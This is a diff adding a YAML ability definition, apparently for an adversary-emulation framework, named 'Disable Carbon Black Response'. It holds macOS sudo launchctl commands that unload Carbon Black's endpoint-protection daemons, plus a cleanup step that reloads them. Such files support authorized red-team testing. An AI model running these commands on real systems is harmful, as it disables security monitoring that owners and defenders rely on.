@@ -1,0 +1,18 @@
+---
+- id: ac8b270b934f97529a09688fe944b347
+  name: Disable Carbon Black Response
+  description: 'Disables Carbon Black Response
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    darwin:
+      sh:
+        command: sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist;
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+        payloads: []
+        cleanup: sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist;
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
